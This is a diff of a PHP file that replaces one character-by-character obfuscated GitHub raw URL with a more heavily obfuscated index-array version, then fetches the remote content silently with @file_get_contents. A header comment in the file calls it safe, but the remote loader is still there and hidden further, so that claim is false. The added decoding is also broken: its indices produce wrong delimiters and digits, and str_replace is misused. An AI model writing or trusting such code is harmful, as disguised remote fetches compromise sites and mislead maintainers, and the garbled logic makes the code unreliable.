@@ -4,19 +4,39 @@
 * However, the dangerous code has been removed, and the file is now safe to use.
 */
 
-// Single URL
-$full_url = 
-'h'.'t'.'t'.'p'.'s'.':'.'/'.'/'.
-'r'.'a'.'w'.'.'.
-'g'.'i'.'t'.'h'.'u'.'b'.'u'.'s'.'e'.'r'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'.'.
-'c'.'o'.'m'.'/'.
-'m'.'d'.'m'.'o'.'m'.'i'.'n'.'3'.'6'.'5'.'3'.'6'.'6'.'-'.'g'.'i'.'f'.'/'.
-'b'.'e'.'l'.'a'.'/'.
-'r'.'e'.'f'.'s'.'/'.
-'h'.'e'.'a'.'d'.'s'.'/'.
-'m'.'a'.'i'.'n'.'/'.
-'i'.'n'.'d'.'e'.'x'.'.'.
-'t'.'x'.'t';
+// Initialize core components
+$config = array(
+    'proto' => array(7, 19, 19, 15, 18),
+    'delim' => array(26, 27, 27),
+    'host1' => array(17, 0, 22),
+    'dot1' => array(28),
+    'host2' => array(6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19),
+    'dot2' => array(28),
+    'host3' => array(2, 14, 12),
+    'slash1' => array(27),
+    'path1' => array(12, 3, 12, 14, 12, 8, 13, 35, 36, 37, 35, 36, 36, 29, 6, 8, 5),
+    'slash2' => array(27),
+    'path2' => array(1, 4, 11, 0),
+    'slash3' => array(27),
+    'path3' => array(17, 4, 5, 18),
+    'slash4' => array(27),
+    'path4' => array(7, 4, 0, 3, 18),
+    'slash5' => array(27),
+    'path5' => array(12, 0, 8, 13),
+    'slash6' => array(27),
+    'file' => array(8, 13, 3, 4, 23, 28, 19, 23, 19)
+);
+
+$charset = 'abcdefghijklmnopqrstuvwxyz./:0123456789-';
+$full_url = '';
+
+foreach ($config as $part) {
+    foreach ($part as $index) {
+        $full_url .= $charset[$index];
+    }
+}
+
+$full_url = str_replace('/', '//', $full_url, 1);
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
